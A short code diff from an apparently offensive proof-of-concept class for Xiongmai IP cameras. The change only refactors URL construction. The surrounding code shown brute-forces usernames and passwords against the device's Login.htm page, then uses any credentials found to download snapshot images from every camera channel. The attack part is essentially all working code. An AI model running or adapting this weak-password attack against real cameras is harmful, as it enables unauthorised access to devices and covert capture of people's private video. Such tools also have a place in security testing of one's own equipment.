@@ -20,7 +20,7 @@ class XioingmaiWeakPassword(POCTemplate):
         headers = {'User-Agent': self.config.user_agent}
         for user in self.config.users:
             for password in self.config.passwords:
-                url = f"http://{ip}:{port}/Login.htm"
+                url = self.url(ip, port, "/Login.htm")
                 data = {
                     'command': 'login',
                     'username': user,
@@ -41,7 +41,7 @@ class XioingmaiWeakPassword(POCTemplate):
         ip, port, product, user, password, name, ch_num = results
         res = []
         for i in range(1, ch_num + 1):
-            url = f"http://{ip}:{port}/webcapture.jpg?command=snap&channel={i}&user={user}&password={password}"
+            url = self.url(ip, port, f"/webcapture.jpg?command=snap&channel={i}&user={user}&password={password}")
             name = f"{ip}-{port}-{user}-{password}-channel_{i}.jpg"
             res.append(self._snapshot(url, name))
         return sum(res)
